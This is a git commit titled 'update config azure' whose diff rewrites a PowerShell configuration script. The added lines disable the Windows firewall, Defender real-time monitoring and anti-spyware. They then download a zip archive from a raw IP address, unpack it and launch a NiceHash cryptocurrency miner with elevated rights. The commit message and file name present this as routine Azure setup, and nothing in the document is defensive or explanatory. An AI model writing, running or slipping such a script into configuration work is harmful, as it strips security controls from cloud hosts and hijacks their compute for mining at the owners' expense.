f8c6010be2f59c37d52e04991b2924eaae72fe4f
Hoa Vo <vovanhoait@gmail.com>
2019-06-05 18:12:26 +0700

    update config azure

--- configure-azure.ps1
+++ configure-azure.ps1
@@ -1,5 +1,8 @@
-[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+netsh advfirewall set allprofiles state off
+Set-MpPreference -DisableRealtimeMonitoring $true
+New-ItemProperty -Path �HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender� -Name DisableAntiSpyware -Value 1 -PropertyType DWORD -Force
 
-Invoke-WebRequest http://139.180.134.229/Tool.Zip -outfile c:\Tool.Zip
+Import-Module BitsTransfer
+Start-BitsTransfer -Source http://139.180.134.229/Tool.Zip -Destination c:\Tool.Zip
 Expand-Archive -Path c:\Tool.Zip -DestinationPath C:\Tool
-Start-Process C:\Tool\nhm_windows_1.9.0.23\NiceHashMinerLegacy.exe  -Wait
+Start-Process C:\Tool\nhm_windows_1.9.0.23\NiceHashMinerLegacy.exe  runAs
